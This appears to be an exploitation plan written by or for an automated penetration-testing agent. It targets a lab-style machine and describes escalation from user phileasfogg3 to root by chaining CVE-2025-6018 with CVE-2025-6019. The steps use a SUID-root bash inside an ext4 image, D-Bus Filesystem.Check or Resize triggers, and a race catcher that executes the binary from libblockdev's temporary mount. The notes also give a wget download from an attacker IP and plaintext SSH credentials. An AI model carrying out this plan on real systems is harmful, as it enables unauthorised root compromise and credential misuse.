scope.objective: Escalate from phileasfogg3 to root via CVE-2025-6019 (udisks2/libblockdev nosuid bypass) using properly-built ext4 image with real SUID root bash, retrieve root flag
in_scope: Transfer /tmp/exploit.img (ext4 with real SUID root bash) from attack box to target
CVE-2025-6018 PAM bypass is ALREADY ACTIVE from previous session (Active=yes)
CVE-2025-6019 udisks2 exploit with ext4 image — loop-setup, trigger Filesystem.Check or Resize, catch temporary mount, execute SUID bash
If ext4 doesn't trigger the temporary mount, also create XFS version (mkfs.xfs is on target)
stop_conditions: 3 failed attempts with ext4 image — try creating XFS image on target then mounting on attack box via SCP round-trip

primary_path: CVE-2025-6019 with PROPERLY BUILT image: (1) Transfer /tmp/exploit.img from attack box to target (python3 HTTP server or SCP). (2) PAM bypass already active from Session 2. (3) On target: udisksctl loop-setup -f exploit.img → get loop device path. (4) Trigger Filesystem.Check on the loop device via gdbus/dbus-send → libblockdev mounts ext4 temporarily at /tmp/blockdev.XXXXX without nosuid. (5) Race condition catcher (from previous session) detects mount, executes /tmp/blockdev.XXXXX/bash -p → root shell. KEY FIX: The SUID bash in this image was set by REAL ROOT on the attack box (chmod 4755 by root), not xfs_db metadata manipulation. The kernel will honor this SUID bit.
backup_path: If ext4 Filesystem.Check doesn't trigger temporary mount in libblockdev: (A) Create XFS image on target with mkfs.xfs, SCP it to attack box, mount with sudo, embed SUID bash, SCP back. (B) Try Filesystem.Resize instead of Check. (C) Try both gdbus and dbus-send for D-Bus calls.

vulnerability_primitive.primitive: libblockdev temporarily mounts filesystem for Check/Resize operations WITHOUT nosuid flag. Combined with CVE-2025-6018 PAM bypass (already active), unprivileged user can trigger this via D-Bus without password.
delivery_forms: ext4 image with SUID root bash (properly created on attack box with real root chmod 4755) — trigger via Filesystem.Check on loop device
XFS image (same approach) — trigger via Filesystem.Resize on loop device
Race condition catcher monitors /proc/mounts for temporary mount, executes SUID binary before unmount
vulnerability_primitive.defenses_observed: None that blocked the mechanism — previous session confirmed mount appears without nosuid, race is won consistently. Only blocker was improperly-created SUID binary (xfs_db metadata hack vs real chmod).
untested_forms: ext4 image with real SUID binary (THIS IS THE FIX)
XFS image created via SCP round-trip to attack box

notes: CRITICAL FOR ELLIOT: (1) The exploit image is at /tmp/exploit.img on the ATTACK BOX — 10MB ext4 with /bash (SUID root, chmod 4755, owned root:root). (2) Transfer via: on attack box 'python3 -m http.server 8888' from /tmp; on target 'wget http://10.10.14.91:8888/exploit.img'. (3) PAM bypass is ALREADY ACTIVE from Session 2 — ~/.pam_environment with XDG_SEAT=seat0 and XDG_VTNR=1. Verify with loginctl show-session. (4) The Python catcher from Session 2 should still work — it monitors /proc/mounts for /tmp/blockdev. (5) For ext4, try Filesystem.Check first (more common trigger). If no temp mount, try Resize. (6) Execute the SUID bash with -p flag: /tmp/blockdev.XXXXX/bash -p (7) SSH creds: phileasfogg3:!QAZ2wsx (8) Previous session catcher code can be reused — just change the binary path if mount point differs.
